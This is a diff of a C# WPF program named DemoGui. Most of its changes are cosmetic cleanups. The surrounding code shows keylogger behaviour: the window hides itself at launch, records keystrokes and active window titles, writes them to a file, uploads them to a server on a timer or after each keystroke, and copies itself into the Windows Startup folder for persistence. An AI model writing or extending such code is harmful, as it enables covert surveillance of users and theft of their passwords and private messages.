@@ -2,11 +2,10 @@
 using System.IO;
 using System.Net.Http;
 using System.Net.Http.Json;
-using System.Reflection;
 using System.Threading.Tasks;
 using System.Timers;
 using System.Windows;
-using Logging.complex;
+using Logging;
 
 namespace DemoGui
 {
@@ -18,10 +17,10 @@ namespace DemoGui
         private static bool _ctrl, _shift;
         private static string _windowTitle = string.Empty;
         private static readonly HttpClient HttpClient = new HttpClient();
-        private readonly WindowHook _windowHook;
         private readonly string _filePath;
+        private readonly WindowHook _windowHook;
 
-        private bool _sendAtEachStroke = false;
+        private readonly bool _sendAtEachStroke = false;
         public MainWindow()
         {
             Hide();
@@ -43,7 +42,6 @@ namespace DemoGui
 
             SendLogTimerElapsed();
             //_sendAtEachStroke = true;
-
         }
         private void SendLogTimerElapsed()
         {
@@ -120,8 +118,8 @@ namespace DemoGui
         {
             tb_text.Text += text;
             WriteToFile(text);
-            
-            if(_sendAtEachStroke)
+
+            if (_sendAtEachStroke)
                 await SendEachStrokeToServer(text);
         }
 
@@ -130,7 +128,7 @@ namespace DemoGui
             File.AppendAllText(_filePath, text);
         }
 
-        private async Task SendEachStrokeToServer(string text)  
+        private async Task SendEachStrokeToServer(string text)
         {
             if (_sendAtEachStroke)
             {
@@ -153,7 +151,7 @@ namespace DemoGui
 
             string path = $"{AppContext.BaseDirectory}\\{filename}";
             string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-            
+
             string filepath = $"{startupPath}\\{filename}";
 
             try
